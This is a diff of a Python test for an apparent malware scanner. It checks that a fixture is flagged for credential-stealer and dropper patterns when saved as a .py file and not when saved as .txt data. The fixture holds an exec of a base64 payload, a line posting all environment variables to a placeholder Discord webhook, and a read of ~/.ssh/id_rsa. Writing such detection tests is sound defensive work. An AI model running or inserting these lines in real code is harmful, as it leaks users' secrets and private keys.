@@ -50,10 +50,14 @@ def test_attack4_behavior_fixture():
     fx = ('exec(base64.b64decode("cHJpbnQoJ2hpJyk="))\n'
           'requests.post("https://discord.com/api/webhooks/123456789/abcdef", data=dict(os.environ))\n'
           'open(os.path.expanduser("~/.ssh/id_rsa"))\n')
-    r = scan_behavior({"text": {"behavior_fixture.txt": fx}, "binaries": []}, "demo", _url_fn)
+    # since ruleset 2026.11.08-11 the regex rules run on code/script files only: the fixture is Python code, so it is
+    # a .py file (it used to be .txt); the same text in a .txt data file is not scanned
+    r = scan_behavior({"text": {"behavior_fixture.py": fx}, "binaries": []}, "demo", _url_fn)
     pats = set(r["profile"]["patterns"])
+    as_data = scan_behavior({"text": {"behavior_fixture.txt": fx}, "binaries": []}, "demo", _url_fn)
     _record("Attack 4: credential-stealer + dropper patterns",
-            {"Credential-stealer pattern", "Dropper / loader pattern"} <= pats, f"patterns: {sorted(pats)}")
+            {"Credential-stealer pattern", "Dropper / loader pattern"} <= pats and not as_data["findings"],
+            f"patterns: {sorted(pats)}; as .txt data: {len(as_data['findings'])} finding(s)")
 
 def test_benign_setup_versions_and_env():
     code = textwrap.dedent('''\
